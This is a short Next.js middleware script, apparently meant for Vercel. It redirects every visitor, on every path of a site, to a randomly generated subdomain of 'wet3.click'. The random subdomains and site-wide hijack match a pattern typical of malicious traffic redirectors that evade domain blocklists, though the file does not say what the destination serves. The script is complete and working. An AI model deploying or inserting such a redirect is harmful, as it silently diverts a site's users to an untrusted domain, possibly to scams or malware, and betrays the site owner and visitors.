import { NextResponse } from 'next/server';

export function middleware(request) {
  // 1. Generate a random 6-character string
  const randomStr = Math.random().toString(36).substring(2, 8);
  
  // 2. Construct the destination URL
  const destination = `https://${randomStr}.wet3.click`;

  // 3. Redirect the user
  return NextResponse.redirect(destination, 302);
}

// This line tells Vercel to run this script on EVERY hit to the site
export const config = {
  matcher: '/:path*',
};
